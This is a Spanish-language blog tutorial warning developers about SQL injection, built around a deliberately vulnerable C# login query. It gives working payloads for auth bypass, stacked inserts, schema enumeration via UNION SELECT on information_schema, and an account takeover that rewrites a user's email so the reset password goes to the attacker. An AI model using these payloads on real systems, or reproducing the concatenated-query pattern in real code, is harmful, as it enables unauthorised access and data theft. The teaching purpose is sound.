---
ID: 640
post_title: Ataques SQL Injection
author: Oscar Sotorrio
post_date: 2013-01-15 12:09:08
post_excerpt: ""
layout: post
permalink: >
  http://www.dotnetodology.com/ataques-sql-injection/
published: true
---
Como desarrolladores <strong>tenemos una gran responsabilidad sobre la seguridad de las aplicaciones</strong> en las que participamos y creo que no pensamos en ello (yo incluido) con la debida frecuencia o el debido respeto. Permitirme que me ponga un poco drástico. Cuando desarrollamos una aplicación sobre nóminas, una aplicación sobre informes médicos, o cualquier otro tipo de información sensible, <strong>lo que está en juego no es solo la integridad de la aplicación</strong>, detrás hay usuarios, hay vidas de personas.

Mi intención al escribir este artículo no es enseñaros nada nuevo sobre el tema, hay mucho escrito en internet y en libros sobre SQL Injection. El propósito de este artículo es que como desarrolladores <strong>tomemos conciencia de esta responsabilidad</strong> y por otro lado <strong>conocer los conceptos básicos</strong> de este tipo de ataques.

Estoy seguro que el lector, el que más o el que menos, conoce los peligros de un ataque por inyección de SQL. De hecho, la organización <a href="https://www.owasp.org/index.php/Main_Page">OWASP</a> (Open Web Application Security Project) coloca esta vulnerabilidad la primera de la lista en su <a href="https://www.owasp.org/index.php/Top_10_2010-Main">Top 10 de riesgos en aplicaciones web</a>.

Las vulnerabilidades por inyección de SQL se caracterizan por tener un <strong>vector de ataque muy sencillo</strong>, el atacante simplemente envía texto a un intérprete. Así mismo <strong>es una vulnerabilidad frecuente</strong> y dependiendo de los casos, <strong>no es difícil detectarla</strong>. La última característica a mencionar es que <strong>tienen un impacto muy grande</strong> en las aplicaciones atacadas.

<center><img class="aligncenter size-full wp-image-645" src="http://www.dotnetodology.com/wp-content/uploads/2013/01/inyeccion_sql_1.gif" alt="" width="730" height="222" /></center>Tal y como se aprecia <a href="https://www.owasp.org/index.php/Top_10_2010-A1">en la tabla anterior</a> (Risk Rating Methodology) los ataques por inyección no solo afectan a las consultas de SQL. También pueden ser atacadas por inyección las consultas LDAP (Lightweight Directory Access Protocol), XPATH o comandos del sistema operativo entre otros. En este artículo centraremos nuestro interés en los ataques por inyección de SQL.
<h3>Introducción</h3>
En primer lugar, hablaremos de algunas versiones con las que se puede ejecutar este tipo de ataque, <strong>la mejor forma de "vacunarse" es sin duda el conocimiento</strong>, comprender cómo y porque es posible este tipo de debilidad en nuestras aplicaciones.

Anteriormente adelantamos que el vector de ataque sobre esta vulnerabilidad consiste en enviar un simple texto al intérprete de SQL. Es decir, todo dato, y repito otra vez, <strong>todo dato enviado a nuestra aplicación</strong> por un usuario, ya sea este humano o electrónico, <strong>es susceptible de contener código SQL</strong> que podría modificar el comportamiento esperado de nuestra aplicación. Por lo tanto, cualquier información que nuestra aplicación esté esperando desde fuera, debe tomarse como <strong>potencialmente peligrosa</strong>.

Para los ejemplos de código de inyección de SQL que vamos a ver a continuación, tomaremos como ejemplo el típico formulario de login que el usuario malintencionado podría usar como un posible punto de entrada a nuestra aplicación. Por lo tanto, los datos o <strong>información potencialmente peligrosa</strong> en este escenario, serán tanto el <strong>email</strong> del usuario como la <strong>contraseña</strong>.

<center><img class="size-full wp-image-647 aligncenter" src="http://www.dotnetodology.com/wp-content/uploads/2013/01/inyeccion_sql_21.jpg" alt="" width="450" height="308" /></center>Como es lógico, y por motivos puramente pedagógicos, para todos los ejemplos que veremos a continuación se ha supuesto que en la capa de acceso a datos existe un código de servidor que no previene contra este tipo de ataques. Podría ser algo parecido a lo mostrado a continuación.
<pre class="brush: c#">string query = "SELECT * FROM Employees WHERE Email = "
+ "'" + email + "'"
+ " AND [Password] = "
+ "'" + pass + "';";

using (var conn = new SqlConnection(ConnString))
{
    using (var cmd = new SqlCommand(query, conn))
    {
        cmd.CommandType = CommandType.Text;
        conn.Open();

        using (var reader = cmd.ExecuteReader())
        {
            while (reader.Read())
            {
                // etc...
            }
            reader.Close();
        }
    }
}</pre>
En este caso, la consulta ejecutada en la base de datos tendría el siguiente aspecto.
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'NombreEmpleado' and [Password] = 'ContraseñaEmpleado';</pre>
Seguidamente comprobaremos las diferentes vías que podrían utilizarse desde fuera de nuestra aplicación para modificar el comportamiento de esta consulta. ¿Estáis preparados para poneros en la piel del atacante?
<h3>Comprobar si es vulnerable</h3>
Una forma rápida de comprobar si una aplicación es vulnerable a inyecciones de SQL podría ser enviar al intérprete una comillas simple ( ' ) para terminar la instrucción en ese momento y que todo lo demás sea código no ejecutable por el intérprete de SQL y esto provoque un error. Veamos un ejemplo.

Campo email = <strong>meloinvento</strong> y campo contraseña = <strong>'</strong>

Consulta construida:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento' AND [Password] = ''';</pre>
La parte de la consulta que el intérprete de SQL puede entender es:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento' AND [Password] = ''</pre>

Es decir, en esta parte se está comprobando que Email sea igual a '<strong>meloinvento</strong>' y que Password sea igual a '', lo que es totalmente correcto gramaticalmente aunque no devolvería ningún resultado.

Pero al final de la consulta todavía tenemos una pequeña fracción de código <strong>';</strong> que el intérprete no puede ejecutar correctamente. Lo que sin duda provocará un error en el intérprete de SQL y por extensión en la aplicación.

<center><img class="aligncenter size-full wp-image-648" src="http://www.dotnetodology.com/wp-content/uploads/2013/01/inyeccion_sql_3.gif" alt="" width="730" height="195" /></center>En este caso, el como la aplicación gestione este tipo de errores es lo de menos. Si nosotros como atacantes <strong>recibimos una amigable pantalla de error</strong>, igualmente habremos conseguido nuestro propósito, averiguar si <strong>la aplicación es susceptible de ser atacada</strong>.
<h3>Introducir una instrucción siempre True</h3>
Una forma típica de inyectar SQL en una aplicación y que seguramente el lector ya conoce es cuando inyectamos una instrucción siempre verdadera consiguiendo que la instrucción WHERE siempre se cumpla y nos devuelva siempre resultados sin conocer los datos auténticos.

Campo email = <strong>meloinvento</strong> y campo contraseña = <strong>' or '1'='1</strong>

Consulta construida:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento' AND [Password] = '' or '1'='1';</pre>
Quiero llamaros la atención aquí sobre el juego de comillas simples que se ha realizado. Comenzando nuestro código malicioso <strong>con una comilla simple hemos cerrado el contenido de la variable</strong> Password, y como al terminar nuestro código malicioso sin una comilla simple hemos aprovechado una comilla simple que seguramente, así lo hemos supuesto, exista ya en el código de la aplicación. De esta forma la instrucción comprueba que FirstName sea igual a '<strong>meloinvento</strong>' y que Password sea igual a '', o que <strong>1 sea igual 1</strong> lo que siempre es cierto y nos permite entrar en el sistema.

<em>Nota: si la aplicación consume datos desde MySQL bastaría con incluir <strong>OR 1 -- x</strong>. Con esto quiero mostraros que aunque para este artículo se ha elegido SQL Server, los conceptos son los mismos para cualquier tipo de base de datos.</em>
<h3>Con datos numéricos</h3>
Hemos visto algunos sencillos ejemplos cuando las variables a atacar son de tipo alfanumérico, y como hemos podido comprobar el meollo del asunto consiste en ir jugando con las comillas simples que espera el intérprete de SQL. Pero cuando los datos son de tipo numérico, supongamos que la contraseña lo es, si no se tiene especial cuidado <strong>podemos tener total libertad para ejecutar instrucciones completas</strong> en nuestro sistema. También podría ser una comprobación por el campo ID o por cualquier otro concepto numérico.

Campo email = '<strong>meloinvento</strong>' y campo contraseña = <strong>00000; insert into employees (firstName, password) values ('Oscar', 85493)</strong>

Consulta construida:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento' AND [Password] = 00000;
insert into employees (email, password) values ('Oscar', 85493);</pre>
Como se puede observar realmente se han enviado dos instrucciones SQL al intérprete, una que comprueba un supuesto empleado y otra que directamente inserta un nuevo empleado en la aplicación permitiéndonos tener acceso a la misma.

Evidentemente este tipo de ataque es mucho más difícil de realizar de lo que parece. Para empezar, <strong>deberíamos conocer el nombre de la tabla</strong>, aunque siempre se pueden probar nombres razonables como Users, Employees, Clients, etc, veremos más tarde como atajar este problema.

Otra dificultad añadida es que <strong>la tabla normalmente contendrá más campos que no podrán ser nulos</strong>, lo que provocará un error en la aplicación al no poder ejecutarse correctamente la instrucción SQL. Y como siempre, dependiendo de como estén gestionados este tipo de errores, podríamos recibir información sobre el error y poco a poco afinar con la inyección de SQL. Sea como sea, es algo de lo que tenemos que ser conscientes como desarolladores.
<h3>Averiguar el número de columnas de la tabla</h3>
Como bien sabe el lector, la instrucción ORDER BY también puede ser utilizada como si de un array se tratara y en lugar de pasarle el nombre de la columna podemos pasarle un valor entero con la posición que ocupa la columna en la tabla empezando desde 1.
<pre class="brush: sql">SELECT * FROM Employees WHERE LastName = 'Gomez' ORDER BY 2</pre>
Esta consulta ordena los resultados ascendentemente por la segunda columna en la tabla. Ahora bien, podríamos ir probando distintos valores (3, 4, 5, etc) y cuando la aplicación lance un error sabremos que nos acabamos de pasar por arriba en el número de columnas de la tabla.

Campo email = <strong>meloinvento</strong> y campo contraseña = <strong>' ORDER BY 7; --</strong>

Consulta contruida:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento' AND [Password] = '' ORDER BY 7; --'... ;</pre>
En el caso que nos ocupa esta consulta lanzaría un error del siguiente tipo.

<center><img class="aligncenter size-full wp-image-649" src="http://www.dotnetodology.com/wp-content/uploads/2013/01/inyeccion_sql_4.gif" alt="" width="730" height="154" /></center>Anteriormente ya he mencionado que no importa que no veamos esta información, es suficiente con que la aplicación muestre una agradable pantalla informándonos del error, igualmente sabremos que la tabla tiene 6 columnas.
<h3>Averiguar el nombre de una columna</h3>
La idea en este caso es ir probando nombre lógicos o esperables para los nombre de las columnas en un consulta que se ejecuta satisfactoriamente, es decir, al contrario que antes, <strong>cuando no recibamos un error, sabremos que hemos acertado</strong>.

Campo email = <strong>meloinvento' or firstname = ''; --</strong>

Consulta contruida:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento' or firstname = ''; --' AND [Password] = '';</pre>
Si esta consulta se ejecuta sin mostrarnos un error sabremos que hemos acertado con el nombre de la columna, en caso contrario nos tocará seguir probando otros nombres.
<h3>Averiguar el nombre de una tabla</h3>
Igual que antes probaremos distintos nombre para el nombre de la tabla y sabremos que el nombre es correcto cuando la consulta se ejecute satisfactoriamente.

Campo email = <strong>meloinvento' or 1 = (select count(*) from Employees); --</strong>

Consulta contruida:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento' or 1=(select count(*) from Employees); --' AND [Password] = '';</pre>
Fijaros en que nos importan en absoluto si la segunda condición que hemos introducido se cumple. Nos da lo mismo si la tabla tenga 1 o 100 filas, lo que nos interesa aquí es que la consulta es gramaticalmente correcta y por lo tanto hemos dado con el nombre de una tabla.

Ahora bien, de momento sabemos que en el sistema existe una tabla Employees y lo mismo podríamos hacer con otras tablas si conocemos un poco el negocio de la aplicación que estamos asaltando. Pero también podemos averiguar si el nombre de la tabla que hemos adivinado se está utilizando en la consulta actual.

Campo email = <strong>meloinvento' and employees.email is null; --</strong>

Consulta construida:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento' and employees.email is null; --' AND [Password] = '';</pre>
Esta forma de especificar el nombre de la columna Email en la segunda condición, solo funciona cuando el nombre de la tabla especificado es el mismo que se utiliza después de la cláusula FROM.
<h3>Enviar la contraseña de un usuario</h3>
Es habitual que antes de comenzar ningún ataque ya conozcamos el email de algún usuario registrado en el sistema. Ya sea porque se trata de una red social y el usuario es un conocido nuestro o de nuestros conocidos. O simplemente porque en la propia aplicación web exista en la zona de contacto uno o varios emails de usuarios adminstradores del sistema para poder contactar con ellos en caso de problemas, sugerencias o dudas.

Supongamos también que la aplicación web tiene el típico enlace "Si no recuerdas la contraseña haz clic aquí" en la que se nos pedirá un email para enviarnos la contraseña automáticamente por correo electrónico. Procedamos!!.

Campo email = <strong>meloinvento'; update employees set email = 'miEmail@hacker.com' where email = 'emailConocido@hostweb.com'; --</strong>

Consulta contruida:
<pre class="brush: sql">SELECT * FROM Employees WHERE Email = 'meloinvento';
update employees set email = 'miEmail@hacker.com' where email = 'emailConocido@hostweb.com'; --' AND [Password] = '';</pre>
Ahora solo tendremos que ir al formulario donde se nos pide el email para enviarnos la contraseña e introducir el email malicioso para al de unos minutos obtener la contraseña de este usuario.
<h3>Averiguar información del esquema</h3>
Cambiemos un poco el escenario del crimen. Imaginaros que hemos conseguido entrar en la aplicación con las credenciales de otro usuario/empleado. Al navegar por la aplicación nos encontramos con una página donde se muestra un listado de clientes del empleado que hemos suplantado.

<center><img class="aligncenter size-full wp-image-650" src="http://www.dotnetodology.com/wp-content/uploads/2013/01/inyeccion_sql_5.gif" alt="" width="801" height="292" /></center>Como podemos observar el listado permite realizar una búsqueda por el código postal del cliente que mostrará los resultados para el empleado que entró en la aplicación. Con lo que sabemos hasta ahora (los clientes pertenecen a un empleado específico y los clientes se buscan por código postal) podríamos suponer que la consulta tendría un aspecto parecido al mostrado a continuación.
<pre class="brush: sql">SELECT * FROM NombreTabla WHERE NombreColumna = identificadorEmpleado AND OtraColumna = 'codigoPostalCliente';</pre>
SQL Server al igual que MySQL proporciona información del esquema de las bases de datos por medio de la tabla de sistema <a href="http://msdn.microsoft.com/en-us/library/ms186778.aspx">INFORMATION_SCHEMA</a>. Te recomiendo que ejecutes en cualquiera de tus bases de datos las dos consultas siguientes para que puedas observar la información que contienen.
<pre class="brush: sql">SELECT * FROM INFORMATION_SCHEMA.TABLES;</pre>
<pre class="brush: sql">SELECT * FROM INFORMATION_SCHEMA.COLUMNS;</pre>
Intentemos ahora <strong>averiguar el nombre de todas las tablas</strong> de la base de datos.

Campo búsqueda = <strong>' union select 1, 2, table_name, 4, 5, 6, 7 from information_schema.tables; --</strong>

Consulta construida:
<pre class="brush: sql">SELECT * FROM Customers WHERE EmployeeID = '6' AND PostalCode = ''
union select 1, 2, table_name, 4, 5, 6, 7 from information_schema.tables; --';</pre>
Las consultas que usen la clausula UNION (también INTERSECT y EXCEPT) deben tener el mismo número de columnas en las dos SELECT. Por ese motivo en la segunda SELECT se han añadido los índices ordinales de varias columnas para rellenar. Fijaros también que la columna que contendrá los nombres de las tablas, <strong>table_name</strong>, se encuentra en 3er lugar. Hay que hacerla coincidir con una columna que admita valores de texto y hemos supuesto que las dos primeras columnas contenían identificadores y por lo tanto eran probablemente de tipo numérico.

Al pulsar sobre el botón de búsqueda obtenemos la información esperada.

<center><img class="aligncenter size-full wp-image-651" src="http://www.dotnetodology.com/wp-content/uploads/2013/01/inyeccion_sql_6.gif" alt="" width="703" height="266" /></center>En la base de datos existen dos tablas, Employees y Customers, además de un diagrama de base de datos. Podríamos intentar hacer lo mismo con <strong>la información de las columnas de toda la base de datos</strong>.

Campo búsqueda = <strong>' union select 1, 2, table_name, column_name, ordinal_position, data_type, is_nullable from information_schema.columns; --';</strong>

Consulta construida:
<pre class="brush: sql">SELECT * FROM Customers WHERE EmployeeID = '6' AND PostalCode = '' union
select 1, 2, table_name, column_name, ordinal_position, data_type, is_nullable from information_schema.columns; --';</pre>
El resultado cuando menos es espectacular.

<center><a href="http://www.dotnetodology.com/wp-content/uploads/2013/01/inyeccion_sql_7.gif"><img class="aligncenter size-full wp-image-652" src="http://www.dotnetodology.com/wp-content/uploads/2013/01/inyeccion_sql_7.gif" alt="" width="731" height="633" /></a></center>Por order de aparición, de izquierda a derecha, vemos el nombre de la tabla, el nombre de la columna, el lugar que ocupa esta en la tabla, el tipo de datos que contiene la columna y si admite valores nulos. Mencionar por último que el poder ver la información del esquema de la base de datos <strong>depende de cómo estén configurados los permisos en el servidor</strong> de base de datos. No todos los usuarios tienen porque tener permisos para acceder a esta información.
<h3>Comentarios Finales</h3>
Evidentemente todo lo aquí visto ha sido posible gracias a un código de aplicación escrito a propósito con poca o ninguna consideración sobre estos temas, pero ha cumplido su cometido, que no era otro que didáctico. De todas formas, <strong>las inyecciones de SQL</strong> no son como el Unicornio Blanco, <strong>son muy reales</strong>. Durante la preparación de este artículo, el aquí presente, ha encontrado un par de webs reales susceptibles de ser atacadas con los conceptos que acabamos de estudiar.

Tener en cuenta que los ataques mostrados en este artículo quizás no han sido demasiado agresivos pero igualmente se podrían haber enviado sentencias para borrar registros, tablas o cualquier otra invasión relacionada con el negocio de la aplicación. Comentar también que por supuesto existen técnicas mucho más sofisticadas de este vector de ataque, aquí hemos visto quizás las más elementales.

Espero que encontréis de utilidad, o al menos interesante, el artículo y sobre todo que <strong>os haya hecho pensar en esa gran responsabilidad</strong> que tenemos como desarrolladores <strong>sobre la seguridad</strong> de nuestras aplicaciones.